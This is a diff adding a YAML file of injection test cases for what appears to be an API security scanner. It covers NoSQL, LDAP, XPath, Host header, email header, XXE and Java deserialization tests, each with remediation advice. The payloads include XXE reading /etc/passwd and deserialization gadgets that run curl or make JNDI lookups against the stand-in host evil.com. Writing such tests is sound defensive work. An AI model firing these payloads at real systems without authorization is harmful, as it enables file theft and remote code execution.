@@ -1,0 +1,210 @@
+# InjectionAttacks - General Injection Attack Tests
+# Reference: CWE-89, CWE-77, OWASP API4-2023
+
+api_version: "1.0"
+category: InjectionAttacks
+
+test_cases:
+
+  - id: INJECT-001
+    name: NoSQL Injection via query parameter
+    severity: CRITICAL
+    category: InjectionAttacks
+    cwe_id: CWE-89
+    owasp_ref: API4-2023
+    description: |
+      Test for NoSQL injection in query parameters targeting MongoDB-style APIs.
+    vuln_type: NOSQL_INJECTION
+    method: GET
+    path: /api/{resource}
+    parameters:
+      - name: q
+        type: string
+        location: query
+    payloads:
+      - '{"$ne": null}'
+      - '{"$gt": ""}'
+      - '{"$regex": ".*"}'
+      - '{"$where": "1==1"}'
+      - '{"$or": [{"name": "admin"}, {"name": "test"}]}'
+    expected_response:
+      status_code: 200
+    validation:
+      type: nosql_injection
+      indicators:
+        - "admin"
+        - "login"
+        - "dashboard"
+    remediation: |
+      Use parameterized queries.
+      Implement input validation.
+
+  - id: INJECT-002
+    name: LDAP Injection via parameter
+    severity: CRITICAL
+    category: InjectionAttacks
+    cwe_id: CWE-90
+    description: |
+      Test for LDAP injection in login or search parameters.
+    vuln_type: LDAP_INJECTION
+    method: GET
+    path: /api/login
+    parameters:
+      - name: username
+        type: string
+        location: query
+    payloads:
+      - "admin)(&(password=*"
+      - "*)(uid=*"
+      - "admin)(|(password=*)"
+      - "%2a%28uid%3d%2a"
+    expected_response:
+      status_code: 200
+    validation:
+      type: ldap_injection
+      indicators:
+        - "admin"
+        - "authenticated"
+    remediation: |
+      Sanitize LDAP inputs.
+      Use LDAP parameterized queries.
+
+  - id: INJECT-003
+    name: XPath Injection
+    severity: HIGH
+    category: InjectionAttacks
+    cwe_id: CWE-643
+    description: |
+      Test for XPath injection in XML-based APIs.
+    vuln_type: XPATH_INJECTION
+    method: GET
+    path: /api/user
+    parameters:
+      - name: username
+        type: string
+        location: query
+    payloads:
+      - "admin' or '1'='1"
+      - "' or count(/*)=1"
+      - "' or string-length(name())>0"
+    expected_response:
+      status_code: 200
+    validation:
+      type: xpath_injection
+      indicators:
+        - "admin"
+        - "user data"
+    remediation: |
+      Use parameterized XPath queries.
+      Validate XML input.
+
+  - id: INJECT-004
+    name: Host Header Injection
+    severity: HIGH
+    category: InjectionAttacks
+    cwe_id: CWE-644
+    description: |
+      Test for Host header injection in password reset or email links.
+    vuln_type: HOST_INJECTION
+    method: GET
+    path: /api/password/reset
+    headers:
+      - name: Host
+        payload: evil.com
+    bypass_techniques:
+      - host_header: "evil.com"
+      - x_forwarded_host: "evil.com"
+    expected_response:
+      status_code: 200
+    validation:
+      type: host_injection
+      indicators:
+        - "evil.com"
+        - "reset link"
+    remediation: |
+      Validate Host header server-side.
+      Use absolute URLs in emails.
+
+  - id: INJECT-005
+    name: Email Header Injection
+    severity: MEDIUM
+    category: InjectionAttacks
+    cwe_id: CWE-88
+    description: |
+      Test for email header injection in contact/feedback forms.
+    vuln_type: EMAIL_INJECTION
+    method: POST
+    path: /api/contact
+    parameters:
+      - name: email
+        type: string
+        location: body
+    payloads:
+      - "user@example.com%0ACc: admin@evil.com"
+      - "user@example.com%0D%0ALine2: injected"
+      - "user@example.com\r\nCc: admin@evil.com"
+    expected_response:
+      status_code: 200
+    validation:
+      type: email_injection
+      indicators:
+        - "success"
+    remediation: |
+      Sanitize email input.
+      Remove newlines from email headers.
+
+  - id: INJECT-006
+    name: XML External Entity Injection
+    severity: HIGH
+    category: InjectionAttacks
+    cwe_id: CWE-611
+    description: |
+      Test for XXE injection in XML-parsing endpoints.
+    vuln_type: XXE
+    method: POST
+    path: /api/xml/upload
+    parameters:
+      - name: xml_data
+        type: string
+        location: body
+    payloads:
+      - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+      - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><foo>&xxe;</foo>'
+    expected_response:
+      check_pattern: "root:"
+    validation:
+      type: xxe
+      indicators:
+        - "root:"
+        - "file content"
+    remediation: |
+      Disable XML external entity processing.
+      Use safe XML parsers.
+
+  - id: INJECT-007
+    name: Jackson/XML Parsing Deserialization
+    severity: CRITICAL
+    category: InjectionAttacks
+    cwe_id: CWE-502
+    description: |
+      Test for Java deserialization vulnerabilities.
+    vuln_type: DESERIALIZATION
+    method: POST
+    path: /api/object
+    parameters:
+      - name: data
+        type: string
+        location: body
+    payloads:
+      - '{"@type":"java.lang.ProcessBuilder","cmd":["curl","evil.com"]}'
+      - '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"jdbc:ldap://evil.com:389/obj","autoCommit":true}'
+    expected_response:
+      status_code: 200
+    validation:
+      type: deserialization
+      indicators:
+        - "command execution"
+        - "JNDI"
+    remediation: |
+      Avoid deserialization of untrusted data.
+      Use JSON-safe parsers.
